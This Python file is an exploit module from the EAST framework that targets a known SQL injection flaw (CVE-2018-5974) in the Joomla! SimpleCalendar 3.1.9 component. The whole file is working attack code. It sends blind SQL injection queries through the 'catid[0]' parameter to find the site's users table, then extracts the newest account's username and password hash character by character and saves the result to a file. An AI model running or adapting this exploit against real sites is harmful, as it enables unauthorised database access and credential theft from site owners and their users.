#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import time
import urllib
import urllib2
import string
from collections import OrderedDict

sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_joomla_simplecalendar_bsqli"
INFO['DESCRIPTION'] = "Joomla! Component SimpleCalendar 3.1.9 - SQL Injection"
INFO['VENDOR'] = "http://albonico.ch/"
INFO['DOWNLOAD_LINK'] = 'https://www.exploit-db.com/apps/9e347ce8940552616eeb13b3dd3fc29a-com_simplecalendar_3.1.9_20170630.zip'
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/44126/']
INFO["CVE Name"] = "CVE-2018-5974"
INFO["NOTES"] = """
Blind SQL Injection vulnerability in "catid[0]" parameter
"""
INFO['CHANGELOG'] = "20 Feb 2018. Written by Gleg team."
INFO['PATH'] = 'Exploits/Web/'

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS['HOST'] = '192.168.1.207', dict(description = 'Target IP')
OPTIONS['PORT'] = 80, dict(description = 'Target Port')
OPTIONS["SSL"] = False, dict(description = 'Use SSL')
OPTIONS["BASEPATH"] = '/joomla3', dict(description = '')

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.ssl = False
        self.port = port
        self.host = host
        self.basepath = '/joomla3'
        self.pool = string.ascii_letters + string.digits + '._:$/\\+'
        self.table = ''
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.ssl = bool(self.args.get('SSL', self.ssl))
        self.basepath = self.args.get('BASEPATH', self.basepath)
        
        if self.ssl:
            context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
            opener = urllib2.build_opener(urllib2.HTTPSHandler(context=context))
            urllib2.install_opener(opener)
        
        self.url = self.make_url('/index.php?option=com_simplecalendar&view=events&catid[0]=')
        
        self.sql_t = "(SELECT (CASE WHEN (substring((select TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE concat(char(37),char(95),char(117),char(115),char(101),char(114),char(115)) and table_schema=database() LIMIT 1),{pos},1)=char({char})) THEN 4 ELSE 2449*(SELECT 2449 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))"
        
        self.sql_c = '(SELECT (CASE WHEN (substring((select concat(username,char(58),password) from TABLE order by registerDate desc limit 1),{pos},1)=char({char})) THEN 4 ELSE  2449*(SELECT 2449 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))'
        
    def make_url(self, path = ''):
        return '{}{}:{}{}{}'.format(self.prot(), self.host, self.port, self.basepath, path)
    
    def prot(self):
        return self.ssl and 'https://' or 'http://'
        
    def guess_letter(self, sql_s, pos):
        for c in self.pool:
            sql = sql_s.format(pos=pos, char=ord(c))
            try:
                fd = urllib2.urlopen(self.url + urllib.quote(sql))
                return c
            except Exception as e:
                continue
        return None
        
    def run(self):
        self.args()
        self.log('')
        
        self.log('Begin extracting users table name (LIKE %_users)')
        self.log('This may take about 5 minutes')
        
        i, self.table = 1, ''
        char = self.guess_letter(self.sql_t, i)
        while char:
            i += 1
            self.table += char
            self.log('Current result: ' + self.table)
            char = self.guess_letter(self.sql_t, i)
            
        if self.table == '':
            self.log('Table name not found')
            self.finish(False)
            
        self.log('')
        self.log('Found table ' + self.table)
        self.log('')
        
        self.log('Begin extracting admin\'s credentials')
        self.log('This may take about 15 minutes')
        
        self.sql_c = self.sql_c.replace('TABLE', self.table)
        i, result = 1, ''
        char = self.guess_letter(self.sql_c, i)
        while char:
            i += 1
            result += char
            self.log('Current result: ' + result)
            char = self.guess_letter(self.sql_c, i)
        
        if result:
            self.log('End with: {}'.format(result))
            self.writefile(result)
            self.finish(True)
            return 1
        
        self.log('Failed')
        self.finish(False)
        return 0

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()